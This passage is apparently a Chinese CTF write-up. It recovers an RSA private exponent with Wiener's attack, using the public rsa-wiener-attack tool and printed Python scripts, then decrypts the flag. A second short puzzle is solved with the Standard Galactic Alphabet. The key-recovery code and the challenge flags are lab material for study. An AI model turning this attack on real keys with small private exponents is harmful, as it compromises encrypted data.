N : 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597

e : 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619

enc : 38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192
```

e比较大，使用维纳攻击获得d,使用rsa-wiener-attack工具求出d,

`ps:`开始本来想着使用`yafu`求出`p,q`，但是分解不出来。

下载链接：`https://github.com/pablocelayes/rsa-wiener-attack`

修改其中的`RSAwienerHacker.py`:

```python
if __name__ == "__main__":
    #test_is_perfect_square()
    #print("-------------------------")
    n = 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597
    e = 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619
    d = hack_RSA(e,n)
    print("d=",d)
```

`d = 8264667972294275017293339772371783322168822149471976834221082393409363691895`

最后直接用脚本解密即可：

```python
#coding:utf-8
from libnum import n2s,s2n
    
n =460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597

d = 8264667972294275017293339772371783322168822149471976834221082393409363691895

c = 38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192

m=pow(c,d,n)
print(n2s(m))
```

得到`flag{Wien3r_4tt@ck_1s_3AsY}`





## 来自宇宙的信号

![1570685710252](1570685710252.png)

还是积累太少啊。这是标准银河密码

![1570685669522](1570685669522.png)

对照得到`flag{nopqrst}`